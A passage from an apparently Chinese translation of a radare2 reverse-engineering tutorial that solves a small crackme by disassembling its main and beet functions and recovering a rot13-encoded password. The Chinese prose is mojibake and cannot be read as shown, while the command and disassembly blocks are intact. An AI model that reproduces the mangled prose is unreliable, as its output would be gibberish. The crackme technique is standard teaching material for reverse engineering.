‡å¿—ä»¥åŠå¯¹åº”æ‰€åœ¨çš„å‡½æ•°åã€‚åœ¨è¿™ä¹‹å‰è¦ç¡®ä¿é€‰æ‹©äº†å­—ç¬¦ä¸²çš„æ ‡å¿—ç©ºé—´ï¼ˆé»˜è®¤æ—¶æ˜¯<code>fs *</code>ï¼‰ã€‚</p><h2 id="å®šä½"><a href="#å®šä½" class="headerlink" title="å®šä½"></a>å®šä½</h2><p>æ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä¹‹å‰æˆ‘ä»¬ä¸€ç›´åœ¨ç¨‹åºçš„å…¥å£ç‚¹ï¼Œç°åœ¨åº”è¯¥å»å…¶ä»–åœ°æ–¹çœ‹çœ‹äº†ã€‚æˆ‘ä»¬åˆšåˆ—å‡ºæ¥çš„å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨<code>main</code>å‡½æ•°ä¸­çš„ã€‚ä¸ºäº†å®šä½åˆ°å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>seek</code>å‘½ä»¤ï¼Œç”¨<code>s</code>æ›¿ä»£ã€‚æ­£å¦‚å¤§å®¶æ‰€çŸ¥é“çš„ï¼Œåœ¨ï¼ˆå‡ ä¹ï¼‰æ¯ä¸ªå‘½ä»¤ååŠ ä¸Š<code>?</code>ä¼šè§£å†³ä½ æ‰€æœ‰çš„é—®é¢˜ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> s?</span><br><span class="line">|Usage: s  # Seek commands</span><br><span class="line">| s                 Print current address</span><br><span class="line">| s addr            Seek to address</span><br><span class="line">| s-                Undo seek</span><br><span class="line">| s- n              Seek n bytes backward</span><br><span class="line">| sâ€“                Seek blocksize bytes backward</span><br><span class="line">| s+                Redo seek</span><br><span class="line">| s+ n              Seek n bytes forward</span><br><span class="line">| s++               Seek blocksize bytes forward</span><br><span class="line">| s[j*=]            List undo seek history (JSON, =list, *r2)</span><br><span class="line">| s/ DATA           Search for next occurrence of â€˜DATAâ€™</span><br><span class="line">| s/x 9091          Search for next occurrence of \x90\x91</span><br><span class="line">| s.hexoff          Seek honoring a base from core-&gt;offset</span><br><span class="line">| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr</span><br><span class="line">| sb                Seek aligned to bb start</span><br><span class="line">| sC[?] string      Seek to comment matching given string</span><br><span class="line">| sf                Seek to next function (f-&gt;addr+f-&gt;size)</span><br><span class="line">| sf function       Seek to address of specified function</span><br><span class="line">| sg/sG             Seek begin (sg) or end (sG) of section or file</span><br><span class="line">| sl[?] [+-]line    Seek to line</span><br><span class="line">| sn/sp             Seek next/prev scr.nkey</span><br><span class="line">| so [N]            Seek to N next opcode(s)</span><br><span class="line">| sr pc             Seek to register</span><br></pre></td></tr></table></figure><p><code>seek</code>å‘½ä»¤æ˜¯æ¥æ”¶ä¸€ä¸ªåœ°å€æˆ–æ˜¯ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥æ˜¯æ•°å­¦è¿ç®—ã€æ ‡å¿—æˆ–è€…å†…å­˜è®¿é—®æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>s main</code>æ¥å®šä½åˆ°mainå‡½æ•°ã€‚è®©æˆ‘ä»¬å…ˆé€šè¿‡<code>afl</code>å‘½ä»¤ï¼ˆAnalyze Functions Listï¼‰æ¥æŸ¥çœ‹<code>radare2</code>ä¸ºæˆ‘ä»¬åˆ—å‡ºäº†å“ªäº›å‡½æ•°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> afl</span><br><span class="line">0x080482ec    3 35           sym._init</span><br><span class="line">0x08048320    1 6            sym.imp.strcmp</span><br><span class="line">0x08048330    1 6            sym.imp.strcpy</span><br><span class="line">0x08048340    1 6            sym.imp.puts</span><br><span class="line">0x08048350    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x08048360    1 6            sub.__gmon_start___252_360</span><br><span class="line">0x08048370    1 33           entry0</span><br><span class="line">0x080483a0    1 4            sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080483b0    4 43           sym.deregister_tm_clones</span><br><span class="line">0x080483e0    4 53           sym.register_tm_clones</span><br><span class="line">0x08048420    3 30           sym.__do_global_dtors_aux</span><br><span class="line">0x08048440    4 43   -&gt; 40   sym.frame_dummy</span><br><span class="line">0x0804846b   19 282          sym.rot13</span><br><span class="line">0x08048585    1 112          sym.beet</span><br><span class="line">0x080485f5    5 127          main</span><br><span class="line">0x08048680    4 93           sym.__libc_csu_init</span><br><span class="line">0x080486e0    1 2            sym.__libc_csu_fini</span><br><span class="line">0x080486e4    1 20           sym._fini</span><br></pre></td></tr></table></figure><p>è¿™äº›å¯¼å…¥å‡½æ•°æ­£æ˜¯æˆ‘ä»¬ä¹‹å‰æ‰€çœ‹åˆ°çš„ï¼ŒåŒ…æ‹¬å…¥å£ç‚¹ã€libcã€mainå‡½æ•°å’Œä¸¤ä¸ªå¼•äººæ³¨æ„çš„å‡½æ•°åˆ†åˆ«å«åš<code>sym.beet</code>å’Œ<code>sym.rot13</code>ã€‚</p><h1 id="åæ±‡ç¼–"><a href="#åæ±‡ç¼–" class="headerlink" title="åæ±‡ç¼–"></a>åæ±‡ç¼–</h1><h2 id="mainå‡½æ•°"><a href="#mainå‡½æ•°" class="headerlink" title="mainå‡½æ•°"></a>mainå‡½æ•°</h2><p>æ˜¯æ—¶å€™å»çœ‹çœ‹æ±‡ç¼–ä»£ç äº†ã€‚é¦–å…ˆæˆ‘ä»¬ç”¨<code>s main</code>æ¥å®šä½åˆ°mainå‡½æ•°ï¼Œç„¶åç”¨<code>pdf</code>å‘½ä»¤ï¼ˆPrint Disassemble Functionï¼‰æ¥åæ±‡ç¼–ã€‚æ³¨æ„åœ°å€æ˜¯æ€ä¹ˆå‡†ç¡®åœ°å˜æˆmainå‡½æ•°çš„åœ°å€çš„ã€‚</p><blockquote><ul><li>æ³¨æ„ï¼šæ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œè¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯æ•™å¤§å®¶å­¦ä¹ å’Œäº†è§£<code>radare2</code>ï¼Œè€Œä¸æ˜¯æ•™æ±‡ç¼–è¯­è¨€çš„ã€‚å› æ­¤æˆ‘ä¸ä¼šå½»åº•åœ°è§£é‡Šä»£ç ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªç¨‹åºä¹Ÿå¾ˆç®€å•ï¼Œä½ åªè¦æœ‰ä¸€ç‚¹ç‚¹åŸºç¡€çš„é€†å‘å·¥ç¨‹çŸ¥è¯†å°±èƒ½æŒæ¡ã€‚</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> s main</span><br><span class="line"><span class="meta">[0x080485f5]&gt;</span> pdf</span><br><span class="line">          ;â€“ main:</span><br><span class="line">/ (fcn) main 127</span><br><span class="line">|   main ();</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; var int local_4h @ esp+0x4</span><br><span class="line">|              ; DATA XREF from 0x08048387 (entry0)</span><br><span class="line">|           0x080485f5      8d4c2404       lea ecx, [esp + local_4h]   ; 0x4</span><br><span class="line">|           0x080485f9      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x080485fc      ff71fc         push dword [ecx â€“ 4]</span><br><span class="line">|           0x080485ff      55             push ebp</span><br><span class="line">|           0x08048600      89e5           mov ebp, esp</span><br><span class="line">|           0x08048602      53             push ebx</span><br><span class="line">|           0x08048603      51             push ecx</span><br><span class="line">|           0x08048604      89cb           mov ebx, ecx</span><br><span class="line">|           0x08048606      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x08048609      6800870408     push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.</span><br><span class="line">|           0x0804860e      e82dfdffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|           0x08048613      83c410         add esp, 0x10</span><br><span class="line">|           0x08048616      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x08048619      6815870408     push str.Think_you_can_make_it_ ; â€œThink you can make it?â€ @ 0x8048715</span><br><span class="line">|           0x0804861e      e81dfdffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|           0x08048623      83c410         add esp, 0x10</span><br><span class="line">|           0x08048626      833b01         cmp dword [ebx], 1          ; [0x1:4]=0x1464c45</span><br><span class="line">|       ,=&lt; 0x08048629      7e2a           jle 0x8048655</span><br><span class="line">|       |   0x0804862b      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=0x10101</span><br><span class="line">|       |   0x0804862e      83c004         add eax, 4</span><br><span class="line">|       |   0x08048631      8b00           mov eax, dword [eax]</span><br><span class="line">|       |   0x08048633      83ec0c         sub esp, 0xc</span><br><span class="line">|       |   0x08048636      50             push eax</span><br><span class="line">|       |   0x08048637      e849ffffff     call sym.beet</span><br><span class="line">|       |   0x0804863c      83c410         add esp, 0x10</span><br><span class="line">|       |   0x0804863f      85c0           test eax, eax</span><br><span class="line">|      ,==&lt; 0x08048641      7412           je 0x8048655</span><br><span class="line">|      ||   0x08048643      83ec0c         sub esp, 0xc</span><br><span class="line">|      ||   0x08048646      682c870408     push str.Success__n ; â€œSuccess!.â€ @ 0x804872c</span><br><span class="line">|      ||   0x0804864b      e8f0fcffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|      ||   0x08048650      83c410         add esp, 0x10</span><br><span class="line">|     ,===&lt; 0x08048653      eb10           jmp 0x8048665</span><br><span class="line">|     |||      ; JMP XREF from 0x08048629 (main)</span><br><span class="line">|     |||      ; JMP XREF from 0x08048641 (main)</span><br><span class="line">|     |-&gt; 0x08048655      83ec0c         sub esp, 0xc</span><br><span class="line">|     |     0x08048658      6836870408     push str.Nop__Wrong_argument._n ; â€œNop, Wrong argument..â€ @ 0x8048736</span><br><span class="line">|     |     0x0804865d      e8defcffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|     |     0x08048662      83c410         add esp, 0x10</span><br><span class="line">|     |        ; JMP XREF from 0x08048653 (main)</span><br><span class="line">|     `â€”&gt; 0x08048665      b800000000     mov eax, 0</span><br><span class="line">|           0x0804866a      8d65f8         lea esp, [ebp â€“ local_8h]</span><br><span class="line">|           0x0804866d      59             pop ecx</span><br><span class="line">|           0x0804866e      5b             pop ebx</span><br><span class="line">|           0x0804866f      5d             pop ebp</span><br><span class="line">|           0x08048670      8d61fc         lea esp, [ecx â€“ 4]</span><br><span class="line">\           0x08048673      c3             ret</span><br></pre></td></tr></table></figure><p>çœ‹è¿‡æ±‡ç¼–ä»£ç åï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€æ®µç®€å•çš„ä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span> &amp;&amp; beet(argv[<span class="number">1</span>]) == <span class="literal">true</span>) </span><br><span class="line"><span class="meta"># i.e - <span class="meta-keyword">if</span> any argument passed to the program AND the result of beet, given the passed argument, is true</span></span><br><span class="line"><span class="meta"># argc is the number of arguments passed to the program</span></span><br><span class="line"><span class="meta"># argc will be at least 1 becuase the first argument is the program name</span></span><br><span class="line"><span class="meta"># argv is the array of parameters passed to the program</span></span><br><span class="line">&#123;</span><br><span class="line">    print <span class="string">"success"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">     print <span class="string">"fail"</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="å¯è§†åŒ–æ¨¡å¼å’Œå›¾å½¢æ¨¡å¼"><a href="#å¯è§†åŒ–æ¨¡å¼å’Œå›¾å½¢æ¨¡å¼" class="headerlink" title="å¯è§†åŒ–æ¨¡å¼å’Œå›¾å½¢æ¨¡å¼"></a>å¯è§†åŒ–æ¨¡å¼å’Œå›¾å½¢æ¨¡å¼</h2><p><code>radare2</code>æœ‰ç€ä¸€ä¸ªéå¸¸å¼ºå¤§ã€æ•ˆç‡æé«˜çš„å¯è§†åŒ–æ¨¡å¼ã€‚å¯è§†åŒ–æ¨¡å¼å¯¹ç”¨æˆ·éå¸¸å‹å¥½å¹¶ä¸”å°†ä½¿ç”¨<code>r2</code>çš„é€†å‘è¿‡ç¨‹å¸¦åˆ°äº†ä¸€ä¸ªæ–°çš„é«˜åº¦ã€‚æŒ‰ä¸‹<code>V</code>é”®å¼€å¯å¯è§†åŒ–æ¨¡å¼ã€‚æŒ‰ä¸‹<code>p</code>/<code>P</code>é”®ç”¨æ¥åˆ‡æ¢æ¨¡å¼ã€‚åœ¨å±å¹•çš„æœ€ä¸Šæ–¹å¯ä»¥çœ‹åˆ°ä½ è¾“å…¥çš„å‘½ä»¤ã€‚è¿™é‡ŒæŒ‰<code>p</code>å¯ä»¥åˆ‡æ¢å›åŸæ¥çš„åæ±‡ç¼–æ¨¡å¼ã€‚</p><p><img src="https://www.megabeets.net/uploads/visualMode_1.png" alt></p><h3 id="å¯è§†åŒ–æ¨¡å¼åŸºæœ¬å‘½ä»¤"><a href="#å¯è§†åŒ–æ¨¡å¼åŸºæœ¬å‘½ä»¤" class="headerlink" title="å¯è§†åŒ–æ¨¡å¼åŸºæœ¬å‘½ä»¤"></a>å¯è§†åŒ–æ¨¡å¼åŸºæœ¬å‘½ä»¤</h3><h4 id="ç§»åŠ¨"><a href="#ç§»åŠ¨" class="headerlink" title="ç§»åŠ¨"></a>ç§»åŠ¨</h4><p>ä½ å¯ä»¥é€šè¿‡<code>k</code>å‘ä¸Šç§»åŠ¨ï¼Œé€šè¿‡<code>j</code>å‘ä¸‹ç§»åŠ¨ã€‚å›è½¦é”®å¯ä»¥<code>jmp</code>æˆ–è€…<code>call</code>åˆ°ç›®æ ‡åœ°å€ã€‚åŒæ—¶åœ¨æ¯ä¸ª<code>jmp</code>æˆ–<code>call</code>å³ä¾§æ³¨é‡Šçš„æ–¹æ‹¬å·ä¸­æœ‰æ•°å­—ï¼Œç›´æ¥æŒ‰ç›¸åº”çš„æ•°å­—å¯è·³è½¬åˆ°å¯¹åº”åœ°å€ã€‚</p><h4 id="å¸®åŠ©"><a href="#å¸®åŠ©" class="headerlink" title="å¸®åŠ©"></a>å¸®åŠ©</h4><p>æ­£å¦‚ä¹‹å‰å‘½ä»¤è¡Œä¸‹çš„<code>radare2</code>ï¼ŒæŒ‰ä¸‹<code>?</code>å¯ä»¥ä¸ºä½ å±•ç°å¸®åŠ©çª—å£ï¼Œä½ å¯ä»¥å­¦ä¹ å¯è§†åŒ–æ¨¡å¼ä¸‹çš„å„ä¸ªå‘½ä»¤ã€‚</p><h4 id="äº¤å‰å¼•ç”¨"><a href="#äº¤å‰å¼•ç”¨" class="headerlink" title="äº¤å‰å¼•ç”¨"></a>äº¤å‰å¼•ç”¨</h4><p>ç”¨<code>x</code>/<code>X</code>åˆ†åˆ«æ¥åˆ—å‡ºå½“å‰å‡½æ•°çš„å¼•ç”¨å’Œè°ƒç”¨çš„æƒ…å†µã€‚æŒ‰ä¸‹å¯¹åº”æ•°å­—æ¥è·³è½¬ã€‚</p><h4 id="radare2å‘½ä»¤"><a href="#radare2å‘½ä»¤" class="headerlink" title="radare2å‘½ä»¤"></a><code>radare2</code>å‘½ä»¤</h4><p>ä½¿ç”¨ï¼šåœ¨å¯è§†åŒ–æ¨¡å¼ä¸‹è¾“å…¥<code>:command</code>æ¥æ‰§è¡Œ<code>r2</code>å‘½ä»¤</p><h4 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h4><p>ä½ å¯ä»¥é€šè¿‡<code>;[-]comment</code>æ¥æ·»åŠ æˆ–åˆ å»æ³¨é‡Šã€‚</p><h4 id="æ ‡è®°"><a href="#æ ‡è®°" class="headerlink" title="æ ‡è®°"></a>æ ‡è®°</h4><p><code>m&lt;key&gt;</code>å¯ä»¥ç”¨æ¥æ ‡è®°ç‰¹å®šçš„åç§»åœ°å€ã€‚<code>&#39;&lt;key&gt;</code>æ¥è·³åˆ°æŒ‡å®šåœ°å€ã€‚</p><h4 id="é€€å‡º"><a href="#é€€å‡º" class="headerlink" title="é€€å‡º"></a>é€€å‡º</h4><p>æŒ‰ä¸‹<code>q</code>é”®è¿”å›åˆ°<code>r2</code>çš„shellã€‚</p><h3 id="å¯è§†åŒ–å›¾å½¢æ¨¡å¼"><a href="#å¯è§†åŒ–å›¾å½¢æ¨¡å¼" class="headerlink" title="å¯è§†åŒ–å›¾å½¢æ¨¡å¼"></a>å¯è§†åŒ–å›¾å½¢æ¨¡å¼</h3><p>å’Œå…¶ä»–çš„ä¸€äº›åæ±‡ç¼–å™¨ä¸€æ ·ï¼Œ<code>radare2</code>ä¹Ÿæœ‰å›¾å½¢è§†å›¾ã€‚ä½ å¯ä»¥è¾“å…¥<code>VV</code>ä»shellè¿›å…¥å›¾å½¢è§†å›¾ï¼Œé€šè¿‡<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼ŒæŒ‰<code>g</code>é”®è·³è½¬åˆ°ç›®æ ‡å‡½æ•°ï¼ˆä¾‹å¦‚<code>gd</code>ï¼‰ã€‚</p><p><img src="https://www.megabeets.net/uploads/visualGraph_1.png" alt></p><p>æŒ‰<code>?</code>æ¥åˆ—å‡ºæ‰€æœ‰çš„å‘½ä»¤ï¼Œå…¶ä¸­<code>R</code>å‘½ä»¤å€¼å¾—ä¸€å­¦ã€‚</p><h2 id="åæ±‡ç¼–beetå‡½æ•°"><a href="#åæ±‡ç¼–beetå‡½æ•°" class="headerlink" title="åæ±‡ç¼–beetå‡½æ•°"></a>åæ±‡ç¼–<code>beet</code>å‡½æ•°</h2><p>æ¥ä¸‹æ¥å›åˆ°åæ±‡ç¼–å‡½æ•°ä¸Šï¼Œçœ‹çœ‹<code>beet</code>å‡½æ•°ã€‚æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬çš„ç¨‹åºæ£€æŸ¥äº†<code>beet</code>çš„è¿”å›ç»“æœï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼è¾“å‡º<code>beet</code>çš„è¿”å›å€¼ï¼Œè¿™é‡Œåˆ—å‡ºå‡ ç§ï¼š</p><ol><li>åœ¨<code>r2</code>çš„shellä¸­å®šä½åˆ°<code>beet</code>å‡½æ•°ï¼Œç„¶åé€šè¿‡<code>s sym.beet</code>ï¼ˆ<code>sym.beet</code>æ˜¯<code>beet</code>å‡½æ•°çš„ä¸€ä¸ªæ ‡å¿—ã€‚ä½ å¯ä»¥é€šè¿‡<code>f sym.&lt;tab&gt;</code>è¾“å‡ºå‡º<code>sym</code>çš„æ ‡å¿—ï¼‰è¾“å‡ºå‡½æ•°ï¼Œç„¶åæ‰§è¡Œ<code>pdf</code>ï¼ˆPrint Disassemble Functionï¼‰ï¼›</li><li>åœ¨<code>r2</code>çš„shellä¸‹ï¼Œé€šè¿‡<code>pdf @ sym.beet</code>è¾“å‡º<code>beet</code>å‡½æ•°ã€‚<code>@</code>æ˜¯ä¸´æ—¶çš„å®šä½ï¼ˆè¾“å‡º<code>sym.beet</code>åœ°å€å¤„çš„å‡½æ•°ï¼‰ï¼›</li><li>å¯è§†åŒ–æ¨¡å¼ä¸‹åœ¨mainå‡½æ•°ä¸‹è·³åˆ°<code>beet</code>å‡½æ•°ï¼›</li><li>å¯è§†åŒ–å›¾å½¢ç•Œé¢ä¸‹åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨<code>gd</code>ï¼ˆ<code>d</code>æ˜¯<code>call</code>è¾¹ä¸Šçš„å­—æ¯ï¼‰</li></ol><p>è¿™æ˜¯<code>beet</code>å‡½æ•°åœ¨å›¾å½¢è§†å›¾ä¸‹çš„æ ·å­ï¼š</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet1.png" alt></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å‚æ•°è¢«å¤åˆ¶ç»™äº†ä¸€ä¸ªç¼“å†²ç©ºé—´ã€‚ç¼“å­˜åŒºçš„ä½ç½®åœ¨<code>ebp - local_88h</code>ã€‚<code>local_88h</code>å…¶å®æ˜¯0x88ï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„136ã€‚åœ¨å¯è§†åŒ–æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>:</code>æ‰§è¡Œ<code>r2</code>çš„å‘½ä»¤<code>? 0x88</code>æŸ¥çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:&gt; ? 0x88</span><br><span class="line">136 0x88 0210 136 0000:0088 136 â€œ\x88â€ 10001000 136.0 136.000000f 136.000000</span><br></pre></td></tr></table></figure><p>ç”±äº4ä¸ªå­—èŠ‚ä¿å­˜äº†å‰ä¸€ä¸ªæ ˆå¸§çš„ebpå€¼ï¼Œæ¥ä¸‹æ¥çš„4ä¸ªå­—èŠ‚åˆ™æ˜¯è¿”å›åœ°å€ï¼Œå› æ­¤åœ¨æ ˆä¸Šçš„ç¼“å†²åŒºå¤§å°ä¸º128ä¸ªå­—èŠ‚ï¼Œæ€»å…±ä¸º136ä¸ªå­—èŠ‚ã€‚</p><p>åœ¨ç¼“å†²åŒºä¹‹åæ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ï¼Œå®ƒå’Œå‡½æ•°<code>sym.rot13</code>çš„ç»“æœè¿›è¡Œæ¯”è¾ƒã€‚<a href="https://en.wikipedia.org/wiki/ROT13" target="_blank" rel="noopener">Rot-13</a>æ˜¯ä¸€ä¸ªè‘—åçš„ç½®æ¢åŠ å¯†ï¼Œç»å¸¸åœ¨CTFä»¥åŠCrackmeä¸­ä½¿ç”¨ã€‚è¿™ä¸ªå‡½æ•°æ¥æ”¶äº†9ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œçœ‹èµ·æ¥<code>radare2</code>æ²¡æœ‰æŠŠå®ƒä»¬è¯†åˆ«æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å…¶åœ°å€ä¸Šæ‰§è¡Œ<code>ahi s</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7</span><br></pre></td></tr></table></figure><p><code>ahi s</code>ç”¨æ¥å°†å°†å…·ä½“åœ°å€è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆè¯•è¯•<code>ahi?</code>ï¼‰ã€‚<code>@@</code>æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼ˆè¯•è¯•<code>@@</code>ï¼‰ï¼Œç„¶åè¿™äº›åœ°å€åˆ™æ˜¯<code>sym.beet</code>å‡½æ•°ä¸­æ²¡è¢«<code>radare2</code>è¯†åˆ«æˆå­—ç¬¦ä¸²çš„éƒ¨åˆ†ã€‚æ‰§è¡Œå®Œè¿™æ¡å‘½ä»¤åï¼Œå›¾å½¢è§†å›¾ä¼šè‡ªåŠ¨åˆ·æ–°ï¼ˆå¦‚æœæ²¡æœ‰è‡ªåŠ¨åˆ·æ–°ï¼Œæ‰§è¡Œ<code>r</code>ï¼‰æˆè¿™æ ·ï¼š</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet2.png" alt></p><p>çœ‹èµ·æ¥æ²¡è¢«è¯†åˆ«å‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯<code>Megabeets</code>ï¼ˆæ ¹æ®<a href="https://en.wikipedia.org/wiki/Endianness" target="_blank" rel="noopener">å­—èŠ‚åº</a>åå‘å‹æ ˆå¾—åˆ°ï¼‰ã€‚</p><p>è¯¥ç¨‹åºé€šè¿‡<code>strcmp</code>å°†ç»è¿‡rot13å¤„ç†åçš„<code>Megabeets</code>ä¸æˆ‘ä»¬è¾“å…¥çš„å‚æ•°è¿›è¡Œæ¯”è¾ƒã€‚å¹¸è¿çš„æ˜¯æˆ‘ä»¬ä¸éœ€è¦è¾›è‹¦åœ°åˆ†ærot13çš„å…·ä½“ç®—æ³•ï¼Œå› ä¸º<code>r2</code>æ¡†æ¶ä¸­çš„<code>rahash2</code>å·¥å…·å·²ç»åŒ…å«äº†rot13åŠ å¯†ã€‚</p><p><code>rahash2</code>é€šè¿‡ä¸åŒçš„ç®—æ³•è®¡ç®—æ–‡ä»¶æˆ–æ˜¯å­—ç¬¦ä¸²çš„æ ¡éªŒå€¼ã€‚</p><p>ä½¿ç”¨<code>man rahash2</code>æŸ¥çœ‹æ›´å¤šçš„ç”¨æ³•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:&gt; !rahash2 -E rot -S s:13 -s â€˜Megabeets\nâ€™</span><br><span class="line">Zrtnorrgf</span><br></pre></td></tr></table></figure><p><code>rahash2</code>æ‰§è¡Œäº†<code>rot13(â€œMegabeetsâ€)</code>åå¾—åˆ°äº†å­—ç¬¦ä¸²<code>Zrtnorrgf</code>ã€‚è¾“å…¥<code>!</code>å¯ä»¥åœ¨<code>r2</code>çš„shellä¸‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æˆ‘ä»¬å‡è®¾<code>Zrtnorrgf</code>å°±æ˜¯è¦å’Œæˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œæ¯”è¾ƒçš„å­—ç¬¦ä¸²ã€‚è®©æˆ‘ä»¬åœ¨è°ƒè¯•æ¨¡å¼ä¸‹æ‰“å¼€ç¨‹åºï¼Œä½¿ç”¨<code>ood</code>ï¼ˆè¯•è¯•<code>ood?</code>ï¼‰å¹¶å°†<code>Zrtnorrgf</code>ä½œä¸ºå‚æ•°ï¼Œçœ‹çœ‹æˆ‘ä»¬ä¼šå¾—åˆ°ä»€ä¹ˆã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7749be9]&gt;</span> ood?</span><br><span class="line">| ood [args]    reopen in debugger mode (with args)</span><br><span class="line"><span class="meta">[0xf7749be9]&gt;</span> ood Zrtnorrgf</span><br><span 